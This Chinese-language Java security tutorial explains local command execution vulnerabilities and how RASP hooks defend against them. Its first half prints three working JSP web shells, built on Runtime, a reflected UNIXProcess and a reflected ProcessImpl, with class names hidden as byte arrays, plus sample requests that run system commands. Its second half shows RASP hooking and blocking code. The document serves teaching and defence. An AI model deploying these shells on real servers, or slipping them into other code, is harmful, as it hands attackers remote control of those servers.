# 本地命令执行漏洞

攻击者一旦可以在服务器中执行任意本地系统命令就意味着服务器已被非法控制，在Java中可用于执行系统命令的方式有API有：`java.lang.Runtime`、`java.lang.ProcessBuilder`、`java.lang.UNIXProcess`/`ProcessImpl`。



## 1. Java本地命令执行测试

**示例 - 存在本地命令执行代码(`java.lang.Runtime`)：**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<pre>
<%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = process.getInputStream();
    int a = 0;
    byte[] b = new byte[1024];

    while ((a = in.read(b)) != -1) {
        out.println(new String(b, 0, a));
    }

    in.close();
%>
</pre>
```

攻击者通过向 `cmd` 参数传入恶意的代码即可在服务器上执行任意系统命令，请求：[http://localhost:8000/modules/cmd/cmd.jsp?cmd=ls](http://localhost:8000/modules/cmd/cmd.jsp?cmd=ls)，如下图：

![img](https://oss.javasec.org/images/image-20200920232032191.png)

由于传入的`cmd`参数仅仅是一个两位的英文字母，传统的WAF基本都不具备对该类型的攻击检测，所以如果没有RASP的本地命令执行防御会导致攻击者可以在服务器中执行恶意的命令从而控制服务器。



## 2. 深层调用命令执行测试

**示例 - 存在本地命令执行代码(`java.lang.UNIXProcess`)：**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<pre>
<%
    String[] cmd = request.getParameterValues("cmd");

    if (cmd != null) {
        Class clazz = Class.forName(new String(new byte[]{
                106, 97, 118, 97, 46, 108, 97, 110, 103, 46,
                85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115
        }));

        Constructor constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        byte[][] args = new byte[cmd.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i < args.length; i++) {
            args[i] = cmd[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }

        byte[] bytes  = cmd[0].getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;

        Object object = constructor.newInstance(
                result, argBlock, args.length,
                null, 1, null, new int[]{-1, -1, -1}, false
        );

        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);

        InputStream in = (InputStream) inMethod.invoke(object);
        int a = 0;
        byte[] b = new byte[1024];

        while ((a = in.read(b)) != -1) {
            out.println(new String(b, 0, a));
        }

        in.close();
    }
%>
</pre>
```

**示例 - 存在本地命令执行代码(`java.lang.ProcessImpl`)：**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Scanner" %>

<%
    String str = request.getParameter("cmd");

    if (str != null) {
        Class clazz = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108}));

        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Object object   = constructor.newInstance(str.split("\\s+"), null, "./", new long[]{-1L, -1L, -1L}, false);
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);
        InputStream in = (InputStream) inMethod.invoke(object);
        Scanner     s  = new Scanner(in).useDelimiter("\\A");

        out.println("<pre>");
        out.println(s.hasNext() ? s.next() : "");
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>
```

这部分对于 linux 和 windows 系统的攻击代码有所差异，但原理上一致。

Linux系统，请求：[http://localhost:8000/modules/cmd/linux-cmd.jsp?cmd=ls](http://localhost:8000/modules/cmd/linux-cmd.jsp?cmd=ls)，如下图：

![img](https://oss.javasec.org/images/image-20200920232507347.png)

Windows系统，请求：[http://localhost:8000/windows-cmd.jsp?cmd=cmd%20/c%20dir%20](http://localhost:8000/windows-cmd.jsp?cmd=cmd%20/c%20dir%20)，如下图：

![img](https://oss.javasec.org/images/image-20200920233748774.png)



## 3. 本地命令执行防御

本地命令执行是一种非常高风险的漏洞，在任何时候都应当非常谨慎的使用，在业务中如果使用到了本地系统命令那么应当禁止接收用户传入参数。在很多时候攻击者会利用某些漏洞（如：Struts2、反序列化等）来攻击我们的业务系统，最终利用Java本地命令执行达到控制Web服务器的目的。这种情况下用户执行的系统命令对我们来说就不再受控制了，我们除了可以配置`SecurityManager`规则限制命令执行以外，使用RASP来防御本地命令执行就显得更加的便捷可靠。



### 3.1 RASP防御Java本地命令执行

在Java底层执行系统命令的API是`java.lang.UNIXProcess/ProcessImpl#forkAndExec`方法，`forkAndExec`是一个native方法，如果想要Hook该方法需要使用Agent机制中的`Can-Set-Native-Method-Prefix`，为`forkAndExec`设置一个别名，如：`__RASP__forkAndExec`，然后重写`__RASP__forkAndExec`方法逻辑，即可实现对原`forkAndExec`方法Hook。

**示例 - Java本地命令执行API：**

![img](https://oss.javasec.org/images/image-20201115200801836.png)

使用RASP的Hook机制捕获当前正在执行的系统命令，不过不同的API获取执行的命令参数的方式不太一样。

**示例 - Hook java.lang.ProcessImpl执行系统命令：**

```java
/**
 * Hook Windows系统ProcessImpl类构造方法
 */
@RASPMethodHook(
      className = "java.lang.ProcessImpl", methodName = CONSTRUCTOR_INIT,
      methodArgsDesc = ".*", methodDescRegexp = true
)
public static class ProcessImplHook extends RASPMethodAdvice {

   @Override
   public RASPHookResult<?> onMethodEnter() {
      try {
         String[] commands = null;

         // JDK9+的API参数不一样！
         if (getArg(0) instanceof String[]) {
            commands = getArg(0);
         } else if (getArg(0) instanceof byte[]) {
            commands = new String[]{new String((byte[]) getArg(0))};
         }

         // 检测执行的命令合法性
         return LocalCommandHookHandler.processCommand(commands, getThisObject(), this);
      } catch (Exception e) {
         RASPLogger.log(AGENT_NAME + "处理ProcessImpl异常:" + e, e);
      }

      return new RASPHookResult<?>(RETURN);
   }

}
```



#### 3.1.1 请求参数关联分析

获取到本地命令执行的参数后需要与Http请求的参数进行关联分析，检测当前执行的系统命令是否与请求参数相关，如果确认当前执行的系统命令来源于Http请求参数，那么RASP会立即阻止命令执行并阻断Http请求。

#### 3.1.2 限制执行本地系统命令

因为本地命令执行的危害性极大，所以在默认情况下可以直接禁止本地命令执行，如果业务的确有必要开启那么可以对相应的业务URL做白名单。限制的方式可分为两种类型：

1. 完全限制本地命令执行，禁止在Java中执行任何命令；
2. 允许程序内部的本地命令执行，只在有Http请求的时候才禁止执行命令；

这两种类型的禁止方案为可选方案，可在RASP的云端实时配置。

**示例 - 禁止在HTTP请求时执行本地系统命令：**

![img](https://oss.javasec.org/images/image-20201115203039369.png)

